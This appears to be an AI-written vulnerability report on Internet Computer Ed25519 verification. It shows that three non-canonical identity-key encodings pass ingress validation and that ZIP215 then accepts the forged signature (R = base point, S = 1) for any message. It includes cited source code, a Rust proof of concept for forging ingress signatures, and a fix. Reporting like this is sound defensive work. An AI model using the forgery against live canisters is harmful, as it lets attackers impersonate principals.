The full attack chain needs to be traced precisely through the production code. Let me verify the critical link — whether `user_public_key_from_bytes` (the ingress-path DER parser) actually accepts the non-canonical identity encodings, and whether `verify_signature` under ZIP215 accepts forged signatures for the identity key.

### Title
Signature Forgery via Non-Canonical Identity Key Accepted Through ZIP215 Verification — (`packages/ic-ed25519/src/lib.rs`, `rs/crypto/standalone-sig-verifier/src/lib.rs`, `rs/validator/src/ingress_validation.rs`)

### Summary

The IC's ingress validation pipeline accepts all three non-canonical encodings of the Ed25519 identity element as valid public keys, and the ZIP215 verification equation reduces to a trivially satisfiable condition when the public key is the identity. An unprivileged attacker can derive a principal from any of these three encodings and forge a valid ingress signature for that principal without possessing any private key.

### Finding Description

**Step 1 — Non-canonical identity encodings are accepted throughout the pipeline.**

`PublicKey::deserialize_raw` calls `VerifyingKey::from_bytes`, which accepts all three non-canonical identity encodings:

```
0100000000000000000000000000000000000000000000000000000000000080
eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f
eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

This is explicitly confirmed by the production test: [1](#0-0) 

These keys pass `is_torsion_free()` (they are torsion-free) but fail `is_canonical()`. Neither `deserialize_raw` nor `deserialize_rfc8410_der` rejects them. [2](#0-1) [3](#0-2) 

**Step 2 — `public_key_to_der` / `convert_raw32_to_der` wraps them without any check.** [4](#0-3) [5](#0-4) 

**Step 3 — `validate_user_id` passes trivially.**

The attacker derives the principal from the same DER they will submit, so the hash check is always satisfied: [6](#0-5) 

**Step 4 — `user_public_key_from_bytes` accepts the DER-wrapped non-canonical identity.**

The ingress validation path calls `ic_ed25519::PublicKey::deserialize_rfc8410_der`, which internally uses the same `VerifyingKey::from_bytes` that accepts these encodings: [7](#0-6) 

**Step 5 — ZIP215 `verify_signature` is trivially satisfiable for the identity key.**

The verification equation is: [8](#0-7) 

```
recomputed_r = [S]B + [k] * (-A)
check: (recomputed_r - R).mul_by_cofactor().is_identity()
```

When `A` = identity element `(0,1)`, then `-A = (0,1)` (the identity is its own inverse), so `[k]*(-A) = identity` for any `k`. The equation reduces to:

```
([S]B - R).mul_by_cofactor().is_identity()
```

The attacker chooses `S = 1` and sets `R = [1]B = B` (the Ed25519 base point). Then `[1]B - B = 0`, and `0.mul_by_cofactor() = 0`, which `is_identity()` returns `true`. This holds for **any message** — the challenge `k` is irrelevant.

**Step 6 — `verify_basic_sig_by_public_key` calls `deserialize_raw` then `verify_signature`.** [9](#0-8) 

No torsion or canonicality check is performed before calling `verify_signature`.

### Impact Explanation

An attacker can authenticate as any of the 3 principals derived from the non-canonical identity encodings without possessing a private key. The forged signature `(R=B, S=1)` passes the full ingress validation pipeline for any message. The attacker can make arbitrary canister calls as these principals. The fundamental IC authentication invariant — that only the holder of the corresponding private key can authenticate as a self-authenticating principal — is broken for these three principals.

The practical impact depends on whether any canister has granted permissions to these principals. Because the three encodings are fixed and publicly known, any canister that has ever been configured to trust one of these principals (e.g., through governance, access control lists, or token transfers) is fully compromised.

### Likelihood Explanation

The attack requires no privileges, no network position, and no interaction with other users. The attacker only needs to craft a single ingress HTTP request with a known 44-byte DER key and a 64-byte forged signature. The three target principals are deterministic and can be computed offline. The attack is locally testable.

### Recommendation

In `user_public_key_from_bytes` (or in `verify_basic_sig_by_public_key`), after deserializing an Ed25519 key, reject it if `!pk.is_canonical()`. The `is_canonical()` method already exists: [10](#0-9) 

Alternatively, add a canonicality check in `verify_basic_sig_by_public_key` immediately after `deserialize_raw`: [11](#0-10) 

The `verify_public_key` function in the internal API already checks `is_torsion_free()` but not `is_canonical()` — it should also check canonicality: [12](#0-11) 

### Proof of Concept

```rust
// 1. Pick a non-canonical identity encoding
let nc_identity: [u8; 32] = hex!("eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f");

// 2. DER-wrap it (no validity check performed)
let der = ic_ed25519::PublicKey::convert_raw32_to_der(nc_identity);

// 3. Derive the principal
let principal = PrincipalId::new_self_authenticating(&der);

// 4. Forge a signature: S=1, R=B (Ed25519 base point)
// R = compressed encoding of the Ed25519 base point
let r_bytes = hex!("5866666666666666666666666666666666666666666666666666666666666666");
// S = 1 in little-endian
let s_bytes = hex!("0100000000000000000000000000000000000000000000000000000000000000");
let forged_sig: [u8; 64] = [r_bytes, s_bytes].concat().try_into().unwrap();

// 5. Verify: ZIP215 check ([S]B - R).mul_by_cofactor().is_identity()
//    = ([1]B - B).mul_by_cofactor() = 0 → is_identity() = true ✓
let pk = ic_ed25519::PublicKey::deserialize_raw(&nc_identity).unwrap();
assert!(pk.verify_signature(b"any message", &forged_sig).is_ok());

// 6. Submit ingress with sender=principal, sender_pubkey=der, signature=forged_sig
// → validate_user_id passes (principal matches DER hash)
// → user_public_key_from_bytes accepts the DER
// → verify_basic_sig_by_public_key accepts the forged signature
// → ingress is executed as `principal`
```

### Citations

**File:** packages/ic-ed25519/tests/tests.rs (L500-514)
```rust
fn public_key_accepts_but_can_detect_non_canonical_keys() {
    // The only non-canonical but torsion free points are 3 non-canonical
    // encodings of the identity element:

    const NON_CANONICAL: [[u8; 32]; 3] = [
        hex!("0100000000000000000000000000000000000000000000000000000000000080"),
        hex!("eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f"),
        hex!("eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
    ];

    for nc in &NON_CANONICAL {
        let k = PublicKey::deserialize_raw(nc).unwrap();
        assert!(k.is_torsion_free());
        assert!(!k.is_canonical());
    }
```

**File:** packages/ic-ed25519/src/lib.rs (L556-558)
```rust
    pub fn is_canonical(&self) -> bool {
        self.pk.to_bytes() == self.pk.to_edwards().compress().0
    }
```

**File:** packages/ic-ed25519/src/lib.rs (L587-600)
```rust
    pub fn convert_raw32_to_der(raw: [u8; 32]) -> Vec<u8> {
        const DER_PREFIX: [u8; 12] = [
            48, 42, // A sequence of 42 bytes follows
            48, 5, // An sequence of 5 bytes follows
            6, 3, 43, 101, 112, // The OID (1.3.101.112)
            3, 33, // A bitstring of 33 bytes follows
            0,  // The bitstring has no unused bits
        ];

        let mut der_enc = Vec::with_capacity(DER_PREFIX.len() + Self::BYTES);
        der_enc.extend_from_slice(&DER_PREFIX);
        der_enc.extend_from_slice(&raw);
        der_enc
    }
```

**File:** packages/ic-ed25519/src/lib.rs (L619-631)
```rust
    pub fn deserialize_raw(bytes: &[u8]) -> Result<Self, PublicKeyDecodingError> {
        let bytes = <[u8; Self::BYTES]>::try_from(bytes).map_err(|_| {
            PublicKeyDecodingError::InvalidKeyEncoding(format!(
                "Expected key of exactly {} bytes, got {}",
                Self::BYTES,
                bytes.len()
            ))
        })?;
        let pk = VerifyingKey::from_bytes(&bytes)
            .map_err(|e| PublicKeyDecodingError::InvalidKeyEncoding(format!("{e:?}")))?;

        Ok(Self::new(pk))
    }
```

**File:** packages/ic-ed25519/src/lib.rs (L665-669)
```rust
    pub fn deserialize_rfc8410_der(bytes: &[u8]) -> Result<Self, PublicKeyDecodingError> {
        let pk = VerifyingKey::from_public_key_der(bytes)
            .map_err(|e| PublicKeyDecodingError::InvalidKeyEncoding(format!("{e:?}")))?;
        Ok(Self::new(pk))
    }
```

**File:** packages/ic-ed25519/src/lib.rs (L709-727)
```rust
    pub fn verify_signature(&self, msg: &[u8], signature: &[u8]) -> Result<(), SignatureError> {
        let signature = Signature::from_slice(signature)?;

        let k = Self::compute_challenge(&signature, self, msg);
        let minus_a = -self.pk.to_edwards();
        let recomputed_r =
            EdwardsPoint::vartime_double_scalar_mul_basepoint(&k, &minus_a, signature.s());

        use curve25519_dalek::traits::IsIdentity;

        if (recomputed_r - signature.r())
            .mul_by_cofactor()
            .is_identity()
        {
            Ok(())
        } else {
            Err(SignatureError::InvalidSignature)
        }
    }
```

**File:** rs/crypto/internal/crypto_lib/basic_sig/ed25519/src/api.rs (L43-45)
```rust
pub fn public_key_to_der(key: types::PublicKeyBytes) -> Vec<u8> {
    ic_ed25519::PublicKey::convert_raw32_to_der(key.0)
}
```

**File:** rs/crypto/internal/crypto_lib/basic_sig/ed25519/src/api.rs (L97-103)
```rust
pub fn verify_public_key(pk: &types::PublicKeyBytes) -> bool {
    if let Ok(pk) = ic_ed25519::PublicKey::deserialize_raw(&pk.0) {
        pk.is_torsion_free()
    } else {
        false
    }
}
```

**File:** rs/validator/src/ingress_validation.rs (L626-632)
```rust
fn validate_user_id(sender_pubkey: &[u8], id: &UserId) -> Result<(), RequestValidationError> {
    if id.get_ref() == &PrincipalId::new_self_authenticating(sender_pubkey) {
        Ok(())
    } else {
        Err(UserIdDoesNotMatchPublicKey(*id, sender_pubkey.to_vec()))
    }
}
```

**File:** rs/crypto/standalone-sig-verifier/src/sign_utils.rs (L50-62)
```rust
    let (key, algorithm_id, content_type) = if pkix_algo_id == ed25519_algorithm_identifier() {
        (
            ic_ed25519::PublicKey::deserialize_rfc8410_der(bytes)
                .map_err(|e| CryptoError::MalformedPublicKey {
                    algorithm: AlgorithmId::Ed25519,
                    key_bytes: Some(bytes.to_vec()),
                    internal_error: format!("{:?}", e),
                })?
                .serialize_raw()
                .to_vec(),
            AlgorithmId::Ed25519,
            KeyBytesContentType::Ed25519PublicKeyDer,
        )
```

**File:** rs/crypto/standalone-sig-verifier/src/lib.rs (L20-44)
```rust
        AlgorithmId::Ed25519 => {
            let pk = ic_ed25519::PublicKey::deserialize_raw(pk_bytes).map_err(|e| {
                CryptoError::MalformedPublicKey {
                    algorithm: AlgorithmId::Ed25519,
                    key_bytes: Some(pk_bytes.to_vec()),
                    internal_error: e.to_string(),
                }
            })?;

            if sig.len() != ic_ed25519::SIGNATURE_BYTES {
                return Err(CryptoError::MalformedSignature {
                    algorithm: AlgorithmId::Ed25519,
                    sig_bytes: sig.to_vec(),
                    internal_error: "Invalid length".to_string(),
                });
            }

            pk.verify_signature(msg, sig)
                .map_err(|e| CryptoError::SignatureVerification {
                    algorithm: AlgorithmId::Ed25519,
                    public_key_bytes: pk.serialize_raw().to_vec(),
                    sig_bytes: sig.to_vec(),
                    internal_error: e.to_string(),
                })
        }
```
